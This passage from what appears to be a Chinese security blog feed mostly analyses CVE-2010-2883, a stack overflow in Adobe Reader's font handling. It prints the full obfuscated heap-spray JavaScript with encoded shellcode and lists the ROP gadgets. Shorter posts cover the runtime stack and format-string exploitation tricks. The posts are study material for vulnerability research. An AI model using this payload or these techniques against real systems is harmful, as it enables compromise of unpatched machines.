<p><img src="https://s2.loli.net/2022/04/26/jR6UBirCG47VnXf.png" alt="结果"></p>
<p>成功打开了计算器</p>
<h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><h3 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h3><table>
<thead>
<tr>
<th align="left"></th>
<th align="left"></th>
</tr>
</thead>
<tbody><tr>
<td align="left">操作系统</td>
<td align="left">Windows XP SP3</td>
</tr>
<tr>
<td align="left">虚拟机</td>
<td align="left">VMWare</td>
</tr>
<tr>
<td align="left">调试软件</td>
<td align="left">OllyDbg</td>
</tr>
<tr>
<td align="left">反汇编软件</td>
<td align="left">IDA</td>
</tr>
<tr>
<td align="left">漏洞软件</td>
<td align="left">Adobe Reader 9.3.4</td>
</tr>
</tbody></table>
<h3 id="相关知识"><a href="#相关知识" class="headerlink" title="相关知识"></a>相关知识</h3><h4 id="strcat-函数"><a href="#strcat-函数" class="headerlink" title="strcat 函数"></a>strcat 函数</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">strcat</span><span class="params">(<span class="keyword">char</span> *dest, <span class="keyword">const</span> <span class="keyword">char</span> *src)</span></span>;</span><br></pre></td></tr></table></figure>

<p>strcat 会将参数 src 字符串复制拼接到参数 dest 所指的字符串尾部，与 strcpy 一样是常见的造成栈溢出漏洞产生的危险函数。</p>
<h3 id="基于字符串定位漏洞"><a href="#基于字符串定位漏洞" class="headerlink" title="基于字符串定位漏洞"></a>基于字符串定位漏洞</h3><p>使用IDA反汇编 CoolType.dll 库，搜索文本 SING (ALT+T)查看，因为该字符串是漏洞解析出错的地方</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.rdata:0819DB4C ; const char aSing[]</span><br><span class="line">.rdata:0819DB4C aSing           db &#x27;SING&#x27;,0             ; DATA XREF: sub_8015AD9+D2↑o</span><br><span class="line">.rdata:0819DB4C                                         ; sub_803DCF9+7B↑o ...</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>找到后再单击 x 查看引用。</p>
<p><img src="https://s2.loli.net/2022/04/26/GZrcHXYC94pn5ES.png" alt="查看引用"></p>
<p>根据《软件战争 软件漏洞分析技术揭秘》书中内容，我们逐个排查比对找到对应代码与危险函数strcat。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line">.text:0803DD74                 push    offset aSing    ; &quot;SING&quot;</span><br><span class="line">.text:0803DD79                 push    edi             ; int</span><br><span class="line">.text:0803DD7A                 lea     ecx, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD7D                 call    sub_8021B06</span><br><span class="line">.text:0803DD82                 mov     eax, [ebp+108h+var_12C]</span><br><span class="line">.text:0803DD85                 cmp     eax, esi</span><br><span class="line">.text:0803DD85 ;   &#125; // starts at 803DD53</span><br><span class="line">.text:0803DD87 ;   try &#123;</span><br><span class="line">.text:0803DD87                 mov     byte ptr [ebp+108h+var_10C], 2</span><br><span class="line">.text:0803DD8B                 jz      short loc_803DDC4</span><br><span class="line">.text:0803DD8D                 mov     ecx, [eax]</span><br><span class="line">.text:0803DD8F                 and     ecx, 0FFFFh</span><br><span class="line">.text:0803DD95                 jz      short loc_803DD9F</span><br><span class="line">.text:0803DD97                 cmp     ecx, 100h</span><br><span class="line">.text:0803DD9D                 jnz     short loc_803DDC0</span><br><span class="line">.text:0803DD9F</span><br><span class="line">.text:0803DD9F loc_803DD9F:                            ; CODE XREF: sub_803DCF9+9C↑j</span><br><span class="line">.text:0803DD9F                 add     eax, 10h</span><br><span class="line">.text:0803DDA2                 push    eax             ; Source</span><br><span class="line">.text:0803DDA3                 lea     eax, [ebp+108h+Destination]</span><br><span class="line">.text:0803DDA6                 push    eax             ; Destination</span><br><span class="line">.text:0803DDA7                 mov     [ebp+108h+Destination], 0</span><br><span class="line">.text:0803DDAB                 call    strcat</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<h3 id="具体分析"><a href="#具体分析" class="headerlink" title="具体分析"></a>具体分析</h3><p>我们将该段给反汇编为伪源代码并截取其中关键部分来分析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">……</span><br><span class="line"><span class="keyword">int</span> v18; <span class="comment">// [esp+44h] [ebp-24h] BYREF</span></span><br><span class="line">……</span><br><span class="line"><span class="keyword">if</span> ( v18 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( !(<span class="keyword">unsigned</span> __int16)*(_DWORD *)v18 || (<span class="keyword">unsigned</span> __int16)*(_DWORD *)v18 == <span class="number">256</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          Destination[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">          <span class="built_in">strcat</span>(Destination, (<span class="keyword">const</span> <span class="keyword">char</span> *)(v18 + <span class="number">0x10</span>));    <span class="comment">//v18指向SING表，0x10为uniqueName相较于SING表的偏移</span></span><br><span class="line">          sub_8001243(Destination);</span><br><span class="line">          v6 = v18;</span><br><span class="line">        &#125;</span><br><span class="line">        v21 = <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">……</span><br></pre></td></tr></table></figure>

<p>很明显，调用 strcat 时并没有对长度进行限制，造成栈溢出。</p>
<h4 id="EXP分析"><a href="#EXP分析" class="headerlink" title="EXP分析"></a>EXP分析</h4><p>我们直接对msf生成的PDF进行分析即可。<a href="http://www.rabb1t.xyz/2022/04/26/PDF%E6%96%87%E4%BB%B6%E7%BB%93%E6%9E%84/">PDF文件结构</a></p>
<p>使用PdfStreamDumper得到PDF样本中的TTF文件中关于SING表的TableEntry结构数据。</p>
<blockquote>
<p><code>.TTF</code>为后缀的文件被叫做字体文件，其实是一张表，其中包含所有的字体(或合成规则)，</p>
</blockquote>
<p><img src="https://s2.loli.net/2022/04/26/71AKGL84ulnSDFO.png" alt="TTF Font"></p>
<p><img src="https://s2.loli.net/2022/04/26/h5REaAt4j68WxKu.png" alt="find"></p>
<p><img src="https://s2.loli.net/2022/04/26/cxIYeOrilbDSuws.png" alt="SING"></p>
<p>而官方文档给出的对TableEntry结构的定义为：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> struct_SING</span><br><span class="line">&#123;                   <span class="comment">//SING表对应的TableEntry结构</span></span><br><span class="line">  <span class="keyword">char</span> tag[<span class="number">4</span>];      <span class="comment">//标记             &quot;SING&quot;</span></span><br><span class="line">  ULONG checkSun;   <span class="comment">//校验和          0xd9bcc8b5</span></span><br><span class="line">  ULONG offset;     <span class="comment">//相对文件的偏移  0x0000011c</span></span><br><span class="line">  ULONG length;     <span class="comment">//数据长度       0x00001ddf</span></span><br><span class="line">&#125; TableEntry;</span><br></pre></td></tr></table></figure>

<p>依据偏移找到SING表(起始为 0x00000100)</p>
<p><img src="https://s2.loli.net/2022/04/26/c86qBn4t3MzmLX5.png" alt="SING"></p>
<p>接着再偏移0x10，即为uniqueName域(即输入内容的起始为<code>3A B4 18 E5</code>)。执行 strcat 后，会将该部分复制到ebp的指定地址，接下来我们进行动态调试。</p>
<h3 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h3><p>一个小技巧，msf生成pdf前，将文件<code>/usr/share/metasploit-framework/modules/exploits/windows/fileformat/adobe_cooltype_sing.rb</code>，中的第102行注释掉，换成第101行的内容。这可以将exp中的填充字符从随机字符变为’A’。</p>
<p>利用OD调试 Adobe Reader，在刚才找到的引用 SING 表处下断点(F2)，单过执行至 0x803DD85，查看此时寄存器的内容：</p>
<p><img src="https://s2.loli.net/2022/04/26/mwEt91LshxBvcfd.png" alt="register"></p>
<p>此时 EAX 内的内容为 0x48663b4，我们跳转过去看其中内容：</p>
<p><img src="https://s2.loli.net/2022/04/26/ovZ9V2ganjpsG4I.png" alt="OD"></p>
<p>与我们PDF文件中 uniqueName 域中内容对应，这就是程序加载文件内容的地方。待会调用 strcat 时，就会将这块的内容拼接到 Destination 指向的地址。</p>
<p>单过执行至调用 strcat 处(0x803DDAB)，调用 strcat 后查看 Destination 指向的值：</p>
<p><img src="https://s2.loli.net/2022/04/26/sie84KuTDRSX5mM.png" alt="OD"></p>
<p>其中内容已经变为了 uniqueName 域的内容</p>
<p>经过调试，一直跟进到 0x0808B308 再单过就会调出计算器，其内容为 <code>CALL DWORD PTR DS:[EAX]</code>，这就是执行我们ROP指令的地址。然后此时 eax 的值为 0x4A80CB38，查看其中内容：</p>
<p><img src="https://s2.loli.net/2022/04/27/OojmHELgnzUPKIy.png" alt="leave_ret"></p>
<p>其实就是平时栈迁移题里常用的<code>leave_ret</code>指令。此时的 ebp 值为 0x012E4DC，在栈上是</p>
<p><img src="https://s2.loli.net/2022/04/27/AburZOBkgEzmqMh.png" alt="stack"></p>
<p>也就是我们插入的第一个ret地址，我们在这里看看执行时具体会产生什么效果。</p>
<h4 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h4><ul>
<li>首先将栈上的 0x0C0C0C0C 内容赋给ESP，其中内容为 0x4A8063A5，然后ret。执行 0x4A8063A5</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/RDP6C3dcY7UKbfJ.png" alt=" 0x4A8063A5"></p>
<ul>
<li>接着弹出栈上内容赋给 ECX，内容为 0x4A8A0000，然后ret，执行 0x4A802196</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/Lgmnr4psR5IXfbk.png" alt="0x4A802196"></p>
<ul>
<li>将EAX的值赋给[ECX]，此时EAX为 0x0012E6D0，然后ret，执行 0x4A801F90</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/SdPwzRHmsVL4fIT.png" alt="OD"></p>
<p><img src="https://s2.loli.net/2022/04/27/85gaciZpGyKlDhM.png" alt="0x4A801F90"></p>
<ul>
<li>弹出栈上元素赋给EAX，即 0x4A801F90，然后ret，执行 0x4A80B692</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/tIn9CTAVpF6JR5Z.png" alt="0x4A80B692"></p>
<ul>
<li>而 0x4A801F90 连接了一个函数<code>CreateFileA</code>，</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/BXYdQyw39GVaN8u.png" alt="CreateFileA"></p>
<ul>
<li>调用 CreateFileA，创建了一个名为 iso88591 的文件，然后ret</li>
</ul>
<p><img src="https://s2.loli.net/2022/04/27/VU265KIHGtcJvSR.png" alt="OD"></p>
<p>接着调试发现是一样的过程，只不过调用的函数不同。程序接着调用了 CreateFileMappingA，创建文件内存映射</p>
<p><img src="https://s2.loli.net/2022/04/27/bpfTIHMnAgrSsBk.png" alt="CreateFileMappingA"></p>
<p>还有 MapViewOfFile，将shellcode复制到申请的内存处</p>
<p><img src="https://s2.loli.net/2022/04/27/79QuAEmBDsWrTc5.png" alt="MapViewOfFile"></p>
<p>shellcode 是通过嵌入PDF的JavaScript来写入的，内容可以在 PdfStreamDumper 中看到：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> gpEWSNKZtZtrDtXDBlCGqjwdCCvqvwmQdNdYQREWutshKgfOzkONtk = SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz( <span class="string">&#x27;%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u80b8%uaf28%udbe6%ud9d1%u2474%u5bf4%uc933%u31b1%u4331%u0313%u1343%uc383%uca84%u1a5a%u886c%ue3a5%ued6c%u062c%u2d5d%u424a%u9dcd%u0618%u56e1%ub34c%u1a72%ub459%u9133%ufbbf%u8ac4%u9afc%ud146%u7cd0%u1a77%u7c25%u47b0%u2cc4%u0369%uc17b%u591e%u6a40%u4f6c%u8fc0%u6e24%u01e1%u293f%ua321%u41ec%ubb68%u6cf1%u3022%u1bc1%u90b5%ue318%udd1a%u1695%u1962%uc911%u5311%u7462%ua022%ua219%u33a7%u21b9%u981f%ue538%u6bc6%u4236%u348c%u555a%u4f41%ude66%u8064%ua4ef%u0442%u7fb4%u1dea%ud110%u7d13%u8efb%uf5b1%uda11%u57cb%u1d7f%ue259%u1dcd%ued61%u7661%u6650%u01ee%uad6d%ufd4b%uec27%u96fd%u64e1%ufabc%u5311%u0282%u5692%uf17a%u128a%ubd7f%uce0c%uae0d%uf0f8%ucfa2%u9328%u5c25%u7ab0%ue4c0%u8353&#x27;</span> );</span><br><span class="line"><span class="keyword">var</span> ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl = SRrMvMAOXcbsiGKZawqPShWHOEnYUhlMdTQEhPNhZpeaKOjnYCrGkeTCftz( <span class="string">&quot;%&quot;</span> + <span class="string">&quot;u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;%u&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> + <span class="string">&quot;0&quot;</span> + <span class="string">&quot;c&quot;</span> );</span><br><span class="line"><span class="keyword">while</span> (ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl+=ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl;</span><br><span class="line">xhqRDDrTFaPkhbN = ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span>-<span class="number">0x24</span>)/<span class="number">2</span>);</span><br><span class="line">xhqRDDrTFaPkhbN += gpEWSNKZtZtrDtXDBlCGqjwdCCvqvwmQdNdYQREWutshKgfOzkONtk;</span><br><span class="line">xhqRDDrTFaPkhbN += ZIYuBLsDEDDUlkqwSiwiDlyPpVbxsNRSJNnAENDMYMcaUtLeTqphcLlFOlrChQRontCQPHaQfQgalGiEoyQEGcl;</span><br><span class="line">VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG = xhqRDDrTFaPkhbN.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG.length &lt; <span class="number">0x80000</span>) VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG += VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG;</span><br><span class="line">mLVmRyYrugLJciVQSgzSkPkUFzjzDOKYXQkoytvknMtSifxjImzmzSTeiCuEQPphAUUaPPwqzvKauVkNtTGlsHqWo = VmrPkWcbujYqdbZJiVWSIMMnNZUuajPMNDXVukZfeaSvHBnvdKDXfcFypgeqLbG.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span>-<span class="number">0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> TTVHhqJwkQBQtxBZnehysrCfheMgKLPScAahDQdBupbGZfetgTbtisRexcMEZXwfwmcwgapnfnVxiGFHJwuwBYqddyfeF = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (BtzHVK=<span class="number">0</span>;BtzHVK&lt;<span class="number">0x1f0</span>;BtzHVK++) TTVHhqJwkQBQtxBZnehysrCfheMgKLPScAahDQdBupbGZfetgTbtisRexcMEZXwfwmcwgapnfnVxiGFHJwuwBYqddyfeF[BtzHVK]=mLVmRyYrugLJciVQSgzSkPkUFzjzDOKYXQkoytvknMtSifxjImzmzSTeiCuEQPphAUUaPPwqzvKauVkNtTGlsHqWo+<span class="string">&quot;s&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>最后调用计算器</p>
<p><img src="https://s2.loli.net/2022/04/27/Bv6CuDKlznyjEqs.png" alt="WinExec"></p>
<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>主要是构造了ROPchain。</p>
<p>使用到的Gadget主要有：</p>
<ul>
<li>0x4A82A714 &gt; <code>pop esp;ret</code></li>
<li>0x4A8063A5 &gt; <code>pop ecx;ret</code></li>
<li>0x4A802196 &gt; <code>mov dword ptr ds:[ecx],eax;ret</code></li>
<li>0x4A80CB38 &gt; <code>add ebp,794;leave;ret</code></li>
<li>0x4A801F90 &gt; <code>pop eax;ret</code></li>
<li>0x4A80B692 &gt; <code>jmp dword ptr ds:[eax]</code></li>
<li>0x4A842DB2 &gt; <code>xchg eax,edi;ret</code></li>
<li>0x4A801064 &gt; <code>ret</code></li>
<li>……</li>
</ul>
<p>再来看EXP可以很明显的看见其中的gadget</p>
<p><img src="https://s2.loli.net/2022/04/27/WhjETCo8p4i3NtB.png" alt="EXP"></p>
<p>利用这些gadget和嵌入文件的JS代码，将shellcode写入文件的可执行段(绕过DEP)，也就是我们调用 CreateFile 等函数的所申请的内存空间，最后执行。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://blog.joe1sn.top/2020/10/06/%E5%88%9D%E5%AD%A6CVE-2010-2883%E6%BC%8F%E6%B4%9E%E8%B0%83%E8%AF%95%E5%8F%8A%E5%A4%8D%E7%8E%B0/">初学CVE-2010-2883漏洞调试及复现</a></p>
<p><a href="https://www.anquanke.com/post/id/179681">细说CVE-2010-2883从原理分析到样本构造 </a></p>
<p>《软件战争 软件漏洞分析技术揭秘》 2.3 CVE-2010-2883 Adobe Reader TTF字体SING表栈溢出漏洞</p>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>CVE</tag>
        <tag>漏洞复现</tag>
      </tags>
  </entry>
  <entry>
    <title>栈介绍</title>
    <url>/2022/03/04/%E6%A0%88%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>对于此数据结构，我们不过多讲述，仅以执行程序时内存中的运行时栈来简单讲讲。</p>
<span id="more"></span>

<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><p>栈是一种只允许在一端插入或删除的线性表，且允许插入和删除的一端称为栈顶，另一端称为栈底。</p>
<h3 id="运行时栈"><a href="#运行时栈" class="headerlink" title="运行时栈"></a>运行时栈</h3><p>在执行程序时，系统会为这个程序分配一块虚拟地址空间，这块空间中的一部分为该程序对应的<strong>运行时栈</strong>。当一个<code>x86-64</code>过程需要的存储空间超过了寄存器能够存放的大小时，或需要保存局部变量时，就会在栈上分配空间。这个部分称为<strong>过程</strong>的<strong>栈帧</strong>(Stack Frame)。需要注意的是，<strong>程序的栈是从进程地址空间的高地址向低地址增长的</strong>。具体见下图</p>
<p><img src="https://s2.loli.net/2022/03/05/HAdJVeYC9BiNcT2.png" alt="32位模式下内存经典布局"></p>
<h2 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h2><p>后进先出(LIFO)：由于栈只允许在一端插入或删除，因此具有此特性，并称为LIFO(Last In First Out)。</p>
<h2 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h2><h3 id="Push"><a href="#Push" class="headerlink" title="Push"></a>Push</h3><p>即入栈，插入新的元素作为栈顶。</p>
<h3 id="Pop"><a href="#Pop" class="headerlink" title="Pop"></a>Pop</h3><p>即出栈，取出栈顶元素。</p>
<p>在程序运行时栈中也是以入栈与出栈为基本操作。</p>
<h2 id="栈上的局部储存"><a href="#栈上的局部储存" class="headerlink" title="栈上的局部储存"></a>栈上的局部储存</h2><p>到目前为止，大部分过程都不会出现超过寄存器大小的本地存储区域了，不过有时，局部数据还是要存放在内存中，包括：寄存器不足而存放、一个变量的地址要存放、某些局部变量是数组或结构体只能存放在内存中。</p>
<p>而过程中产生的局部变量存储在栈帧中，过程的参数存储在该栈帧前。并且通过入栈顺序和数据大小能轻易计算出与栈帧的偏移，并通过<code>lea</code>指令与<code>rbp</code>寄存器中保存的栈帧地址来得到变量的地址，从而使用。(入栈顺序参考这篇<a href="http://www.rabb1t.xyz/2022/03/04/%E5%85%A5%E6%A0%88%E9%A1%BA%E5%BA%8F/">文章</a>)</p>
<h2 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h2><p>在介绍函数调用栈之前，简单介绍一下过程。</p>
<h3 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h3><p>前面提到在程序运行中，栈会有属于自己的一块空间，并且会分配<strong>过程的栈帧</strong>。实际上，软件中将封装代码的方式称为过程，过程用一组指定参数和一个可选的返回值实现了某种功能。因此我们能想到：函数、方法、处理函数等都是<strong>过程的形式</strong>。</p>
<p>而函数调用栈的过程，实际上对应了计算机提供给过程执行的支持：<strong>传递控制、传递数据、分配和释放内存</strong>。</p>
<h3 id="函数调用栈的过程"><a href="#函数调用栈的过程" class="headerlink" title="函数调用栈的过程"></a>函数调用栈的过程</h3><ol>
<li><p>先是<strong>传递数据</strong>，将此函数所使用到的参数依次入栈，然后得到数据与栈帧指针的偏移来利用数据。</p>
</li>
<li><p>再是<strong>转移控制</strong></p>
<ol>
<li>执行了<code>call</code>指令，进行两步操作：<ol>
<li>将当前<code>ip</code>或<code>cs和ip</code>压入栈中，即<code>push ip</code></li>
<li>转移，与<code>jmp</code>原理相同</li>
</ol>
</li>
</ol>
</li>
<li><p>接着执行函数<strong>分配内存</strong>：</p>
<ol>
<li>将<code>bp</code>压入栈，即<code>push bp</code></li>
<li>减小栈指针，即<code>sub sp,idata</code>，分配了足够大的栈帧空间</li>
</ol>
</li>
<li><p>函数终止，开始<strong>释放内存</strong>：</p>
<ol>
<li><p>执行<code>leave</code>指令，进行两步操作：</p>
<ol>
<li>释放栈空间，即<code>mov sp,bp</code></li>
<li>恢复栈帧，即<code>pop bp</code></li>
</ol>
</li>
<li><p>最后<strong>恢复控制</strong>，执行<code>ret</code>指令：</p>
<ul>
<li>修改<code>ip</code>内容为栈顶中的内容，即<code>pop ip</code></li>
</ul>
</li>
</ol>
</li>
</ol>
<p>至此算是一个函数调用的过程，由此可以看出<strong>过程能够递归的调用它们自身</strong>，并且每个过程都有属于自己的栈帧。</p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>格式化字符串漏洞小结</title>
    <url>/2022/03/04/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/</url>
    <content><![CDATA[<p>记录自己对格式化字符串漏洞的理解。</p>
<span id="more"></span>

<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>格式化字符串漏洞是利用程序员对格式化字符串函数的错误使用导致的对栈上的内容造成了泄露或内存中地址内容的改写。</p>
<p>在利用格式化字符串漏洞前，我们需要对格式化字符串函数有个大概了解，<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/#_2">CTF Wiki</a>上写的很详细。</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>格式化字符串漏洞的利用需要有程序执行格式化字符串函数的环节。</p>
<h3 id="基本利用"><a href="#基本利用" class="headerlink" title="基本利用"></a>基本利用</h3><h4 id="泄露栈上内容"><a href="#泄露栈上内容" class="headerlink" title="泄露栈上内容"></a>泄露栈上内容</h4><p>通过<code>%&#123;&#125;$p</code>来泄露栈上地址。</p>
<h4 id="改写地址内容"><a href="#改写地址内容" class="headerlink" title="改写地址内容"></a>改写地址内容</h4><p>通过<code>%&#123;&#125;$n</code>和向栈上写入任意地址来实现改写任意地址内容。并且’n’为覆盖4字节内容，’hn’为覆盖2字节内容，’hhn’为覆盖1字节内容。</p>
<p>需要注意的是，不同模式下的传参方式不同导致构造的payload中的格式化字符串的参数不同。32位模式下，参数都是在栈上保存的，没什么好说的；64位模式下，前6位参数保存在寄存器内，因此泄露或改写的地址一般从第7位开始计算。</p>
<p>使用<code>pwndbg</code>的<code>fmtarg</code>指令获得泄露该地址的格式化字符串，或手动计算偏移得到格式化字符串。</p>
<p>利用这两个基本操作外，我们根据栈溢出漏洞攻击的思路进行攻击，也有格式化字符串漏洞攻击的技巧。</p>
<h3 id="利用漏洞技巧"><a href="#利用漏洞技巧" class="headerlink" title="利用漏洞技巧"></a>利用漏洞技巧</h3><h4 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h4><p>能利用格式化字符串漏洞泄露栈上内容，因此可以得到出现在栈上的libc函数的地址再计算offset泄露libc的基地址；当开启了随机化保护时，也可以找到栈上main函数的<code>push rbp</code>，即main函数的首地址来计算开栈的基地址以绕过。</p>
<h4 id="对地址块中间的内容进行修改"><a href="#对地址块中间的内容进行修改" class="headerlink" title="对地址块中间的内容进行修改"></a>对地址块中间的内容进行修改</h4><p>由于缓冲区大小的限制，导致我们不能覆盖内容为一个很大的数。因此，我们经常使用<code>hn</code>或<code>hhn</code>来进行改写内容，但由于64位模式下，一个地址块的大小为8字节，所以我们直接以该地址为任意写的地址，我们只能改到最多低2字节。但是我们如果给该地址加上一点偏移作为任意写的地址，就能对地址块中间的内容进行修改。举一个直观的例子：</p>
<p>假设栈上地址<code>0x00</code>的内存块的内容为<code>0xAABBCCDDEEFFGGHH</code></p>
<p>如果我们欲修改<code>0x00</code>地址的中间的<code>0xEE</code>内容的这一个字节。直接以<code>0x00</code>为地址，修改的就是最后的<code>0xHH</code>。所以我们要使用<code>0x03</code>为任意写地址，那么就能修改到中间的<code>0xEE</code>了。</p>
<p>需要注意的是，由于Linux是小端序的系统，所以<code>0x00</code>地址块的内容实际为<code>0xHHGGFFEEDDCCBBAA</code>因此，我们要修改的中间的<code>0xEE</code>的偏移是3，而不是4。</p>
<h4 id="栈上的partial-overwrite"><a href="#栈上的partial-overwrite" class="headerlink" title="栈上的partial overwrite"></a>栈上的partial overwrite</h4><p>栈上的partial overwrite除了利用栈溢出漏洞进行改写，也可以使用格式化字符串漏洞进行低位地址的修改，但是由于需要修改低12位地址，因此还需要泄露待改写函数的倒数第二字节的内容。</p>
<h4 id="利用栈上的链式结构进行任意地址改写"><a href="#利用栈上的链式结构进行任意地址改写" class="headerlink" title="利用栈上的链式结构进行任意地址改写"></a>利用栈上的链式结构进行任意地址改写</h4><p>常用于非栈上的格式化字符串漏洞，即我们写入的格式化字符串并不是在栈上，所以我们不能通过写入任意地址进行改写。</p>
<p>常利用<code>rbp</code>的链式结构(栈帧中的内容总是上一个栈帧或0)对任意地址进行改写。以当前栈帧(rbp中的地址)中存储的上一个栈帧的地址作为任意写的地址并对其中内容进行改写为我们需要修改的内容，再对上一个栈帧中的存储的地址作为任意写的地址并对其中内容进行改写。画一个更直观的图：</p>
<p><img src="https://s2.loli.net/2022/03/04/kXphy9uBxaMcjPg.png" alt="6"></p>
<p><em>暂时就这些，其他的等我想起了或者遇到新的技巧再补充。</em></p>
]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>系统调用介绍</title>
    <url>/2022/03/04/%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p>稍微介绍了一下Linux不同模式的系统调用。</p>
<span id="more"></span>

